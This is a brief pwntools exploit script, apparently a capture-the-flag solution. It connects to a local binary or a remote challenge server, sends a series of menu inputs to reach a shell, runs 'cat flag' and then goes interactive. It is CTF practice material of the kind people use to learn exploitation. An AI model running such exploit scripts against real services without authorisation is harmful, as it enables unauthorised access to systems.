from pwn import *

context.log_level = "debug"
context.arch = "i386"
context.os = "linux"
context.terminal = ["/usr/bin/tmux", "sp", "-h"]

f_remote = True if "remote" in sys.argv else False
f_gdb = True if "gdb" in sys.argv else False

vuln_path = "./main"
elf = ELF(vuln_path)
libc = elf.libc

io = process([vuln_path]) if not f_remote else remote("pwn-c991173724.challenge.xctf.org.cn", 9999, ssl=True)


def ddebug(b=""):
    if not f_gdb: return
    gdb.attach(io, gdbscript=b)
    pause()

# u64(io.recvuntil("\x7f")[-6:].ljust(8, b"\x00"))


io.sendlineafter("count?\n", "2")
io.sendlineafter("option:", "4")
io.sendlineafter("option:", "2")
io.sendlineafter("]:", "2")
io.sendlineafter("]:", "2")
io.sendline(b"cat flag")
io.interactive()
